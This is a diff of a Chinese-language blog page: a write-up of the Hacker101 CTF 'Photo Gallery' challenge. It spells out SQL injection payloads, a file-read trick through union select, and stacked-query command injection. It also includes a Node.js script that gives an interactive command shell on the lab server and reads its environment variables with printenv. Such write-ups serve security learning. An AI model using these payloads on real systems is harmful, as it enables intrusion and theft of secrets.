@@ -19,12 +19,12 @@ j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
 <script data-ad-client="ca-pub-1515253208026743" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
 
 
-    <meta name="description" content="Photo Gallery">
+    <meta name="description" content="Photo Gallery &lt;!-- more --&gt; 0x00 一開始畫面長這樣  發現原始碼有一個 fetch?id&#x3D;1  點進去網址發現回傳一個 jpg 的 text 檔案  從這可以推測他是用 id 去 mysql 取出 filename 然後讀出來的 加個 &#39; 發現好像沒有 SQL Injection 的存在，但卻出現 500 Internal Server Error 可能">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Hacker 101 CTF Write Up Part 4 - Photo Gallery">
 <meta property="og:url" content="https://yu-jack.github.io/2019/09/10/hacker101-part4/index.html">
 <meta property="og:site_name" content="技術雜記 Technology Notes - Jack Yu | 傑克">
-<meta property="og:description" content="Photo Gallery">
+<meta property="og:description" content="Photo Gallery &lt;!-- more --&gt; 0x00 一開始畫面長這樣  發現原始碼有一個 fetch?id&#x3D;1  點進去網址發現回傳一個 jpg 的 text 檔案  從這可以推測他是用 id 去 mysql 取出 filename 然後讀出來的 加個 &#39; 發現好像沒有 SQL Injection 的存在，但卻出現 500 Internal Server Error 可能">
 <meta property="og:locale" content="zh_TW">
 <meta property="og:image" content="https://yu-jack.github.io/images/og_image.png">
 <meta property="article:published_time" content="2019-09-10T14:28:20.000Z">
@@ -174,22 +174,70 @@ j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
         </h1>
         
             <div class="content" style="word-break: break-all;">
-                <h1><span id="photo-gallery">Photo Gallery</span></h1><a id="more"></a>
-<h2><span id="0x00">0x00</span></h2><p>一開始畫面長這樣<br><img src="/images/ctf/part4-photo-1-01.png" alt></p>
-<p>發現原始碼有一個 fetch?id=1<br><img src="/images/ctf/part4-photo-1-02.png" alt></p>
-<p>點進去網址發現回傳一個 jpg 的 text 檔案<br><img src="/images/ctf/part4-photo-1-03.png" alt></p>
-<p>從這可以推測他是用 id 去 mysql 取出 filename 然後讀出來的<br>加個 ‘ 發現好像沒有 SQL Injection 的存在，但卻出現 <code>500 Internal Server Error</code><br>可能程式有哪邊出錯了，繼續往下測試<br><img src="/images/ctf/part4-photo-1-04.png" alt></p>
-<p>不過當改下 <code>fetch?id=1 union all select 1</code> 以及 <code>fetch?id=1 union all select 1,2</code> 發生一點不同變化<br>前者出現跟 <code>fetch?id=1</code> 結果一模一樣 (上圖)<br>後者卻出現 <code>500 Internal Server Error</code> (下圖)<br><img src="/images/ctf/part4-photo-1-05.png" alt><br><img src="/images/ctf/part4-photo-1-06.png" alt></p>
-<p>看來就是有 SQL Injection 的問題了<br>接下來找到可以用 <code>fetch?id=1 and length(database()) = 6</code> 這種方式去判斷後者是否為 true<br>思路大概跟這篇做法一樣 <a href="https://www.hackthis.co.uk/articles/blind-sql-injection">https://www.hackthis.co.uk/articles/blind-sql-injection</a><br>用各種 <code>length()</code> 以及 <code>like &#39;______&#39;</code> 的方式可以找到相對應的值<br>這邊就直接丟 sqlmap 把整個 table dump 出來了<br>就發現 FLAG 了<br><img src="/images/ctf/part4-photo-1-07.png" alt></p>
-<h2><span id="0x01">0x01</span></h2><p>這提跟前一提的 <code>fetch?id=1 union all select 1</code> Payload 有關係<br>前面有提到是透過 id 去撈 filename 回來去顯示<br>改成 <code>fetch?id=123123 union all select &quot;files/adorable.jpg&quot;</code> 發現可以正確觸發<br><img src="/images/ctf/part4-photo-2-01.png" alt></p>
-<p>LFI 漏洞就出現了，我可以任意去讀檔案了<br>本來想說這 php 寫的網站用以下的 payload，結果取得不到 …<br><code>fetch?id=123123 union all select &quot;index.php&quot;</code><br><img src="/images/ctf/part4-photo-2-02.png" alt></p>
-<p>後來看提示才知道這是用 uwsgi-nginx-flask-docker image 做的<br>此 image 原始碼在放在 main.py，所以改成以下 payload 就讀到原始碼，發現第二個 FLAG<br><code>fetch?id=123123 union all select &quot;main.py&quot;</code><br><img src="/images/ctf/part4-photo-2-03.png" alt></p>
-<h2><span id="0x02">0x02</span></h2><p>看到 source code 之後，發現在取得 used space 那邊有 command injection 的問題<br><code>subprocess.check_output(&#39;du -ch %s || exit 0&#39; % &#39; &#39;.join(&#39;files/&#39; + fn for fn in fns), shell=True, stderr=subprocess.STDOUT).strip().rsplit(&#39;\n&#39;, 1)[-1]</code><br>只要能在 filename 加上 ; 再加上後面想要執行的指令就可以觸發 CI 的問題了<br>但要觸發他必須要靠 photos table 裡面的 filename 去觸發<br>一開始嘗試使用 stacked query 的方式，以下為 payload<br><code>541; UPDATE photos SET filename = &#39;; ls &#39; WHERE id = 3;</code>  </p>
-<p>試了很久完全沒有任何反應，本來以為不是 stacked query 這條路<br>結果回去翻題目的提示有提到 COMMIT 這個關鍵字<br>才想到有時候 SQL 指令下 UPDATE 變更完並不會馬上生效<br>而是要下 <code>COMMIT;</code> UPDATE 的語法才會真正觸發<br>於是 Payload 改成以下這樣就成功了，下面變成 uwsgi.ini 了<br><code>fetch?id=541; UPDATE photos SET filename = &quot;; ls&quot; WHERE id = 3; COMMIT;</code><br><img src="/images/ctf/part4-photo-3-01.png" alt></p>
-<p>然後根據 main.py 的 regex 修改一下，然後寫出一個可以一直輸入 command 的 node.js 程式<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">inputFunction</span>(<span class="params">readline</span>) </span>&#123;</span><br><span class="line">    readline.question(<span class="string">`Keep input\n\n`</span>, <span class="keyword">async</span> (command) =&gt; &#123;</span><br><span class="line">        <span class="keyword">const</span> axios = <span class="built_in">require</span>(<span class="string">'axios'</span>)</span><br><span class="line">        <span class="keyword">await</span> axios(&#123;</span><br><span class="line">            method: <span class="string">'GET'</span>,</span><br><span class="line">            url: <span class="string">'http://34.74.105.127/8142a5acbe/fetch'</span>,</span><br><span class="line">            params: &#123;</span><br><span class="line">                id: <span class="string">`541; UPDATE photos SET filename = '; <span class="subst">$&#123;command&#125;</span> | tr "\\n" ";" ' WHERE id = 3; COMMIT;`</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;).then(<span class="function"><span class="params">response</span> =&gt;</span> response.data).catch(<span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="keyword">let</span> result = <span class="keyword">await</span> axios(&#123;</span><br><span class="line">            method: <span class="string">'GET'</span>,</span><br><span class="line">            url: <span class="string">'http://34.74.105.127/8142a5acbe/'</span></span><br><span class="line">        &#125;).then(<span class="function"><span class="params">response</span> =&gt;</span> response.data)</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'\n'</span> + result.split(<span class="string">'Space used: '</span>)[<span class="number">1</span>].split(<span class="string">'&lt;/i&gt;&lt;/div&gt;'</span>)[<span class="number">0</span>].replace(<span class="regexp">/;/g</span>, <span class="string">"\n"</span>));  </span><br><span class="line">        inputFunction(readline)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line">(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> readline = <span class="built_in">require</span>(<span class="string">'readline'</span>).createInterface(&#123;</span><br><span class="line">        input: process.stdin,</span><br><span class="line">        output: process.stdout</span><br><span class="line">    &#125;)</span><br><span class="line">    inputFunction(readline)</span><br><span class="line">&#125;)()</span><br></pre></td></tr></table></figure></p>
-<p>但是逛了老半天 … 完全不知道 flag 放在哪裡<br>跑回去看題目提示到 『enviroment』，才想到有可能放在應用程式裡面的環境<br>最後下一個 <code>printenv</code> 就拿到 FLAG 了 ！<br><img src="/images/ctf/part4-photo-3-02.png" alt></p>
-<p>簡單 demo 影片<br><img src="/images/ctf/part4-photo-demo.gif" alt></p>
-<h1><span id="後記">後記</span></h1><p>這題蠻有趣的，學到 stacked query、command injection 以及 LFI<br>不過過程中有些真的不知道怎麼做，跑去看提示才知道<br>不然真的瞎子摸象摸不太出來 QQ</p>
+                <h1><span id="photo-gallery">Photo Gallery</span></h1>
+<p>&lt;!-- more --&gt;</p>
+<h2><span id="0x00">0x00</span></h2>
+<p>一開始畫面長這樣<br>
+<img src="/images/ctf/part4-photo-1-01.png" alt></p>
+<p>發現原始碼有一個 fetch?id=1<br>
+<img src="/images/ctf/part4-photo-1-02.png" alt></p>
+<p>點進去網址發現回傳一個 jpg 的 text 檔案<br>
+<img src="/images/ctf/part4-photo-1-03.png" alt></p>
+<p>從這可以推測他是用 id 去 mysql 取出 filename 然後讀出來的<br>
+加個 ' 發現好像沒有 SQL Injection 的存在，但卻出現 <code>500 Internal Server Error</code><br>
+可能程式有哪邊出錯了，繼續往下測試<br>
+<img src="/images/ctf/part4-photo-1-04.png" alt></p>
+<p>不過當改下 <code>fetch?id=1 union all select 1</code> 以及 <code>fetch?id=1 union all select 1,2</code> 發生一點不同變化
+前者出現跟 <code>fetch?id=1</code> 結果一模一樣 (上圖)<br>
+後者卻出現 <code>500 Internal Server Error</code> (下圖)<br>
+<img src="/images/ctf/part4-photo-1-05.png" alt>
+<img src="/images/ctf/part4-photo-1-06.png" alt></p>
+<p>看來就是有 SQL Injection 的問題了<br>
+接下來找到可以用 <code>fetch?id=1 and length(database()) = 6</code> 這種方式去判斷後者是否為 true<br>
+思路大概跟這篇做法一樣 https://www.hackthis.co.uk/articles/blind-sql-injection<br>
+用各種 <code>length()</code> 以及 <code>like '______'</code> 的方式可以找到相對應的值<br>
+這邊就直接丟 sqlmap 把整個 table dump 出來了<br>
+就發現 FLAG 了
+<img src="/images/ctf/part4-photo-1-07.png" alt></p>
+<h2><span id="0x01">0x01</span></h2>
+<p>這提跟前一提的 <code>fetch?id=1 union all select 1</code> Payload 有關係<br>
+前面有提到是透過 id 去撈 filename 回來去顯示<br>
+改成 <code>fetch?id=123123 union all select &quot;files/adorable.jpg&quot;</code> 發現可以正確觸發<br>
+<img src="/images/ctf/part4-photo-2-01.png" alt></p>
+<p>LFI 漏洞就出現了，我可以任意去讀檔案了<br>
+本來想說這 php 寫的網站用以下的 payload，結果取得不到 ...<br>
+<code>fetch?id=123123 union all select &quot;index.php&quot;</code>
+<img src="/images/ctf/part4-photo-2-02.png" alt></p>
+<p>後來看提示才知道這是用 uwsgi-nginx-flask-docker image 做的<br>
+此 image 原始碼在放在 main.py，所以改成以下 payload 就讀到原始碼，發現第二個 FLAG
+<code>fetch?id=123123 union all select &quot;main.py&quot;</code>
+<img src="/images/ctf/part4-photo-2-03.png" alt></p>
+<h2><span id="0x02">0x02</span></h2>
+<p>看到 source code 之後，發現在取得 used space 那邊有 command injection 的問題<br>
+<code>subprocess.check_output('du -ch %s || exit 0' % ' '.join('files/' + fn for fn in fns), shell=True, stderr=subprocess.STDOUT).strip().rsplit('\n', 1)[-1]</code><br>
+只要能在 filename 加上 ; 再加上後面想要執行的指令就可以觸發 CI 的問題了<br>
+但要觸發他必須要靠 photos table 裡面的 filename 去觸發<br>
+一開始嘗試使用 stacked query 的方式，以下為 payload<br>
+<code>541; UPDATE photos SET filename = '; ls ' WHERE id = 3;</code></p>
+<p>試了很久完全沒有任何反應，本來以為不是 stacked query 這條路<br>
+結果回去翻題目的提示有提到 COMMIT 這個關鍵字<br>
+才想到有時候 SQL 指令下 UPDATE 變更完並不會馬上生效<br>
+而是要下 <code>COMMIT;</code> UPDATE 的語法才會真正觸發<br>
+於是 Payload 改成以下這樣就成功了，下面變成 uwsgi.ini 了<br>
+<code>fetch?id=541; UPDATE photos SET filename = &quot;; ls&quot; WHERE id = 3; COMMIT;</code>
+<img src="/images/ctf/part4-photo-3-01.png" alt></p>
+<p>然後根據 main.py 的 regex 修改一下，然後寫出一個可以一直輸入 command 的 node.js 程式
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">inputFunction</span>(<span class="params">readline</span>) </span>&#123;</span><br><span class="line">    readline.question(<span class="string">`Keep input\n\n`</span>, <span class="keyword">async</span> (command) =&gt; &#123;</span><br><span class="line">        <span class="keyword">const</span> axios = <span class="built_in">require</span>(<span class="string">'axios'</span>)</span><br><span class="line">        <span class="keyword">await</span> axios(&#123;</span><br><span class="line">            method: <span class="string">'GET'</span>,</span><br><span class="line">            url: <span class="string">'http://34.74.105.127/8142a5acbe/fetch'</span>,</span><br><span class="line">            params: &#123;</span><br><span class="line">                id: <span class="string">`541; UPDATE photos SET filename = '; <span class="subst">$&#123;command&#125;</span> | tr "\\n" ";" ' WHERE id = 3; COMMIT;`</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;).then(<span class="function"><span class="params">response</span> =&gt;</span> response.data).catch(<span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="keyword">let</span> result = <span class="keyword">await</span> axios(&#123;</span><br><span class="line">            method: <span class="string">'GET'</span>,</span><br><span class="line">            url: <span class="string">'http://34.74.105.127/8142a5acbe/'</span></span><br><span class="line">        &#125;).then(<span class="function"><span class="params">response</span> =&gt;</span> response.data)</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'\n'</span> + result.split(<span class="string">'Space used: '</span>)[<span class="number">1</span>].split(<span class="string">'&lt;/i&gt;&lt;/div&gt;'</span>)[<span class="number">0</span>].replace(<span class="regexp">/;/g</span>, <span class="string">"\n"</span>));  </span><br><span class="line">        inputFunction(readline)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line">(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> readline = <span class="built_in">require</span>(<span class="string">'readline'</span>).createInterface(&#123;</span><br><span class="line">        input: process.stdin,</span><br><span class="line">        output: process.stdout</span><br><span class="line">    &#125;)</span><br><span class="line">    inputFunction(readline)</span><br><span class="line">&#125;)()</span><br></pre></td></tr></table></figure></p>
+<p>但是逛了老半天 ... 完全不知道 flag 放在哪裡<br>
+跑回去看題目提示到 『enviroment』，才想到有可能放在應用程式裡面的環境<br>
+最後下一個 <code>printenv</code> 就拿到 FLAG 了 ！
+<img src="/images/ctf/part4-photo-3-02.png" alt></p>
+<p>簡單 demo 影片<br>
+<img src="/images/ctf/part4-photo-demo.gif" alt></p>
+<h1><span id="後記">後記</span></h1>
+<p>這題蠻有趣的，學到 stacked query、command injection 以及 LFI
+不過過程中有些真的不知道怎麼做，跑去看提示才知道<br>
+不然真的瞎子摸象摸不太出來 QQ</p>
 
             </div>
         
@@ -236,9 +284,13 @@ j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
 
 
 <div class="card">
-    <div class="card-content" style="display: flex; justify-content: center;">
-        <iframe src="https://button.like.co/in/embed/jk82421/button" frameborder="0"></iframe>
+    <div class="card-content" style="display: flex; justify-content: center;" id="liker">
     </div>
+    <script>
+        var iframe = document.createElement("iframe")
+        iframe.src = "https://button.like.co/in/embed/jk82421/button?referrer=" + encodeURIComponent(location.href)
+        document.getElementById("liker").appendChild(iframe)
+    </script>
     <div class="card-content">
         <!-- <h3 class="title is-5 has-text-weight-normal">評論</h3> -->
         
